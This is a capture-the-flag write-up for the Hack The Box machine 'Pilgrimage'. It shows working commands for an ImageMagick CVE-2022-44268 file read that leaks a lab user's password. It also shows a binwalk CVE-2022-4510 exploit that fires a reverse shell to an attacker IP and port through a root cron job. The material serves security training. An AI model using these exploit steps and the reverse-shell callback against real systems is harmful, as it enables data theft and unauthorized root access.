---
layout: post
title: "HTB: Pilgrimage"
subtitle: "exposed .git revealed bundled ImageMagick vulnerable to CVE-2022-44268 file read, then a binwalk CVE-2022-4510 root cron"
date: 2023-08-28
tags: [htb, linux, git-dump, imagemagick, cve, cron]
category: writeups
kind: machine
tldr: "An exposed /.git dumped the source and a bundled ImageMagick 7.1.0-49. CVE-2022-44268 let me read arbitrary files through a crafted PNG, which leaked the SQLite DB and emily's password for SSH. A root cron ran binwalk 2.3.2 (CVE-2022-4510) on uploaded files for a root shell."
---

## the box

Pilgrimage is a Linux box running a PHP image-shrinking app on nginx port 80, plus SSH. Upload an image and it returns a resized copy.

## recon

Directory enumeration found an exposed Git repository.

```
/.git/HEAD    (Status: 200)
/.git/config  (Status: 200)
/.git/index   (Status: 200)
```

I pulled the whole repo with git-dumper. The source showed login queries hitting a SQLite database at `/var/db/pilgrimage`, and the repo bundled the `magick` binary the app shells out to.

```
file ./magick
./magick: ELF 64-bit LSB executable, x86-64 ... stripped
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64
```

## foothold

ImageMagick `7.1.0-49` is vulnerable to CVE-2022-44268, an arbitrary file read. A PNG with a crafted text profile makes ImageMagick embed the contents of a named file into the output image as a hex string, readable with `identify -verbose`. The app converts every upload through this binary, so an uploaded malicious PNG comes back with file contents baked in.

I generated the PoC PNG targeting the SQLite DB, uploaded it, downloaded the converted result, and read the embedded data.

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
convert exploit.png result.png
# upload, then fetch the converted image from /shrunk/
identify -verbose 64ea15b80308f.png
```

CVE-2022-44268 keys on a `profile` entry in the PNG `tEXt` chunk, which ImageMagick treats as a filename to load and then embeds back as a hex `Raw profile type` in the output. I stripped the verbose output down to the hex and reversed it to binary, then read it as the SQLite DB it was:

```bash
identify -verbose 64ea15b80308f.png | grep -Pv "^( |Image)" | xxd -r -p > pilgrimage.sqlite
sqlite3 pilgrimage.sqlite "select username,password from users;"
```

That returned emily's plaintext credentials from the `users` table:

```
emily|abigchonkyboi123
```

## user

`emily:abigchonkyboi123` worked over SSH and dropped the user flag.

```bash
ssh emily@pilgrimage.htb
```

## root

emily was not in sudoers. Process listing showed a root job watching the upload directory and running binwalk on whatever appeared.

```
UID=0 | /bin/bash /usr/sbin/malwarescan.sh
UID=0 | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
```

`malwarescan.sh` ran `binwalk -e` on every new file in `shrunk/`, then deleted the file if the output matched a small blacklist:

```bash
blacklist=("Executable script" "Microsoft executable")
binout="$(/usr/local/bin/binwalk -e "$filename")"
```

That blacklist does not matter, because the exploit triggers during the `binwalk -e` call itself, before the grep ever runs. The binwalk version was 2.3.2, vulnerable to CVE-2022-4510, a path-traversal RCE in the PFS extractor. A crafted file makes binwalk write a malicious plugin into `~/.config/binwalk/plugins/` and execute it during extraction. I built the malicious PNG with a public PoC and dropped it into the watched directory.

```bash
python3 exp.py result.png 10.10.16.X 4444
# copy binwalk_exploit.png into /var/www/pilgrimage.htb/shrunk/
```

When the root cron ran binwalk on it, the plugin fired my reverse shell as root and gave the root flag.

## takeaway

A leaked .git handed me the source and the exact ImageMagick build, which mapped to a known file-read CVE. Reading the DB through that bug was enough for SSH, and the root path was a second CVE in a tool a root cron ran on attacker-supplied files.
